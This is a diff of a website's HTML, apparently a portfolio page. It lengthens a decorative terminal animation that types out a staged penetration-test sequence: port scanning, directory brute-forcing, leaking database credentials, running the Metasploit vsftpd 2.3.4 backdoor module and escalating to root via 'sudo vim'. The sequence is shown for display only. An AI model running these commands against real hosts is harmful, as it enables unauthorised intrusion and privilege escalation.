@@ -104,23 +104,43 @@
             </div>
           </div>
         </div>
-        <div class="bg-black text-green-400 font-mono text-sm p-4 rounded-lg shadow-md mt-6 w-full h-[280px] overflow-auto">
+        <div class="bg-black text-green-400 font-mono text-sm p-4 rounded-lg shadow-md mt-6 w-full h-[900px] overflow-auto">
           <pre id="terminal-output" class="whitespace-pre-wrap leading-relaxed">&gt;_</pre>
-        </div>
-        
+        </div>        
         <script>
           const lines = [
-            "$ nmap -sC -sV 10.10.10.10",
-            "[+] Open ports: 22/tcp, 80/tcp, 139/tcp, 445/tcp",
-            "$ smbclient \\\\10.10.10.10\\share",
-            "smb: \\> get creds.txt",
-            "[+] creds.txt saved",
-            "$ hydra -l admin -P rockyou.txt ssh://10.10.10.10",
-            "[+] login: admin / password123",
-            "$ ssh admin@10.10.10.10",
-            "admin@target:~$ whoami",
-            "admin",
-            "admin@target:~$"
+            "$ nmap -sC -sV -p- 10.10.10.10",
+            "[+] Discovered open ports: 21, 22, 80, 443, 3306",
+            "$ gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt",
+            "[+] Found: /backup/",
+            "$ curl http://10.10.10.10/backup/config.zip -o config.zip",
+            "[+] Downloaded config.zip",
+            "$ unzip config.zip",
+            "Archive:  config.zip\n  inflating: db_creds.txt",
+            "$ cat db_creds.txt",
+            "user: dbadmin\npass: P@ssw0rd123",
+            "$ mysql -h 10.10.10.10 -u dbadmin -p",
+            "Enter password: ***********",
+            "mysql> select user, host from mysql.user;",
+            "mysql> \\q",
+            "$ searchsploit vsftpd 2.3.4",
+            "[+] Exploit found: vsftpd_234_backdoor.rb",
+            "$ msfconsole -q",
+            "msf6 > use exploit/unix/ftp/vsftpd_234_backdoor",
+            "msf6 exploit(...) > set RHOST 10.10.10.10",
+            "msf6 exploit(...) > run",
+            "[*] Backdoor service has been spawned",
+            "[*] Command shell session 1 opened",
+            "$ whoami",
+            "ftp",
+            "$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "ftp@target:/home/ftp$ sudo -l",
+            "User ftp may run the following commands on this host:\n    (ALL : ALL) NOPASSWD: /usr/bin/vim",
+            "$ sudo vim -c ':!sh'",
+            "root@target:/root# whoami",
+            "root",
+            "root@target:/root# hostname",
+            "pwned-box"
           ];
         
           const output = document.getElementById("terminal-output");
@@ -129,7 +149,7 @@
           function typeLine(text, i = 0, callback) {
             if (i < text.length) {
               output.textContent += text[i];
-              setTimeout(() => typeLine(text, i + 1, callback), 35);
+              setTimeout(() => typeLine(text, i + 1, callback), 30);
             } else {
               output.textContent += '\n';
               callback();
@@ -140,12 +160,14 @@
             if (lineIndex < lines.length) {
               typeLine(lines[lineIndex], 0, () => {
                 lineIndex++;
-                setTimeout(nextLine, 600);
+                setTimeout(nextLine, 500);
               });
             }
-          }        
+          }
+        
           nextLine();
-        </script>        
+        </script>
+         
         <!-- Blog Section Start -->
           <div id="blogSection" class="hidden space-y-6">
             <div class="bg-[#1f2937] p-6 rounded-xl shadow-md text-white">
